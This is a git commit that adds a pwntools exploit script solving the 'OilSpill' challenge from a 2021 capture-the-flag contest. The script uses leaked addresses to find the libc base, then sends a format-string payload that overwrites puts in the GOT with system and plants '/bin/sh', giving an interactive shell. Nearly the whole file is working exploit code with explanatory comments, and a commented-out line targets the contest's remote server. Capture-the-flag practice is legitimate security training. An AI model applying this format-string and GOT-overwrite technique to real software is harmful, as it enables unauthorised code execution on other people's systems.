9a26a9adfc68caa5afb42200f38a1f6fb6044d2e
qhdwight <qhdwight@gmail.com>
2022-05-08 17:21:38 -0700

    Add oil spill

---
+++ sd-ctf-2021/oilspill/oilspill.py
@@ -0,0 +1,29 @@
+from pwn import *
+
+elf = context.binary = ELF('./OilSpill')
+
+io = process()
+# io = gdb.debug('./OilSpill', 'break *0x00400738\ncontinue')
+# io = remote('oil.sdc.tf', 1337)
+out = io.recvuntil(b'do you have any ideas of what we can use to clean it?\n')
+addrs = [int(a, 16) for a in out.split(b'\n')[0].split(b',')[:4]]
+_, printf_addr, _, _ = addrs
+
+# We can use the address of printf() to calculate the base address of libc (since we know the offset from static analysis)
+printf_offset = elf.libc.sym['printf']
+libc_base_addr = printf_addr - printf_offset
+
+# Overwrite the address of puts() to point to system() in the GOT
+# Also overwrite the value of the global variable 'x' to be /bin/sh
+# So we are effectively now calling system('/bin/sh')
+writes = {
+    elf.got['puts']: libc_base_addr + elf.libc.sym['system'],
+    elf.sym['x']: unpack(b'/bin/sh\0', 64, endian='little', sign=False),
+}
+# 8 is the first offset - we can confirm this by running the program and sending %p 8 times
+# We then see that the last one contains the bytes for %p itself (0x2570)
+payload = fmtstr_payload(8, writes)
+print(hexdump(payload))
+io.sendline(payload)
+
+io.interactive()
